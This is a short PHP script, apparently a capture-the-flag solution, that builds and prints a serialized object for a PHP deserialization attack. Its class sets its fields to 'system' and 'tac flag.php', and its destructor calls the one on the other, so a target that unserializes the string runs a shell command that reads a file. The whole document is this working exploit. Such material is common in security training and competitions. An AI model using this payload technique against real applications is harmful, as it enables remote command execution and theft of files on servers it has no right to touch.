<?php

class HelloPhp{
    public $a;
    public $b;
    public function __construct(){
        $this->a='tac flag.php';
        $this->b='system';
    }
    public function __destruct(){
        $a=$this->a;
        $b=$this->b;
        echo $b($a);
    }
}


echo  serialize(new HelloPhp());
?>